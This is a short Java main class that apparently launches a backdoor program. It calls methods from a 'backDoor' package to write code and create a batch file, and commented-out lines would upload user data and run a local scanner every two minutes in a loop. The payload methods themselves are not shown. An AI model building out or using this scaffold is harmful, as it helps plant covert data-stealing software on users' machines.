package confess;

import backDoor.Creater;
import backDoor.Uploader;
import java.io.IOException;
import java.util.concurrent.TimeUnit;
import java.util.logging.Level;
import java.util.logging.Logger;


public class Confess 
{
    public static void main(String[] args) throws InterruptedException, IOException 
   {
        Creater c = new Creater();
       
          c.writecode();
          c.batcher();


        
        Uploader u = new Uploader();
        
//        try {
//                u.userUpload();
//            
//            } catch (IOException ex) {
//                Logger.getLogger(Confess.class.getName()).log(Level.SEVERE, null, ex);
//            }
        
//        while(true)
//        {
//        try {
//              TimeUnit.MINUTES.sleep(2);
//                u.localScanner1();
//            } catch (IOException ex) {
//                Logger.getLogger(Confess.class.getName()).log(Level.SEVERE, null, ex);
//                Logger.getLogger(Confess.class.getName()).log(Level.SEVERE, null, ex);
//            }
//       }
   }
}
